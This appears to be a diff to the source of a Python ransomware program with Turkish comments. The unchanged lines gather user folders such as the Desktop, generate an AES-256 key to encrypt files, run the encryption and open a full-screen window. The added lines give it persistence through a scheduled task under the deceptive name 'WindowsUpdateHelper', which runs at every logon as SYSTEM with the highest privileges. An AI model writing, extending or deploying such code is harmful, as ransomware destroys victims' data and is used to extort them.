@@ -19,7 +19,43 @@ folders_path = [
     str(os.path.join(Path.home(), "Desktop"))
 
 ]
+import subprocess
+import sys
+import os
 
+
+def add_to_task_scheduler():
+    try:
+        # EXE veya script yolu
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+
+        # Masum görev adı (örneğin "WindowsUpdateHelper" veya "AdobeFlashUpdate")
+        task_name = "WindowsUpdateHelper"
+
+        # Komut: Her kullanıcı girişinde çalışsın (ONLOGON)
+        # /RU SYSTEM → Yüksek haklar, şifre sormaz
+        # /F → Zaten varsa üzerine yaz
+        cmd = [
+            "schtasks", "/Create",
+            "/TN", task_name,
+            "/TR", f'"{exe_path}"',          # exe'yi direkt çalıştır
+            "/SC", "ONLOGON",                # Kullanıcı girişinde
+            "/RL", "HIGHEST",                # En yüksek haklar
+            "/RU", "SYSTEM",                 # SYSTEM hesabı
+            "/F"                             # Zorla oluştur/üzerine yaz
+        ]
+
+        # Eğer .py ise: "/TR", f'"C:\\Python\\pythonw.exe" "{exe_path}"'
+
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+
+        print(f"[+] Task Scheduler kalıcılığı eklendi: {task_name}")
+        print(result.stdout)
+
+    except subprocess.CalledProcessError as e:
+        print(f"[-] schtasks hatası: {e.stderr}")
+    except Exception as e:
+        print(f"[-] Task Scheduler ekleme hatası: {e}")
 
 
 file_key = secrets.token_bytes(32) # dosyaları sifrelemek için kullanılacak sımetrık AES-256
@@ -95,6 +131,7 @@ def encrypt_file():
 
 #if __name__ == "__main__":
     encrypt_file()
+    add_to_task_scheduler()
     root = tk.Tk()
     root.withdraw()
     root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
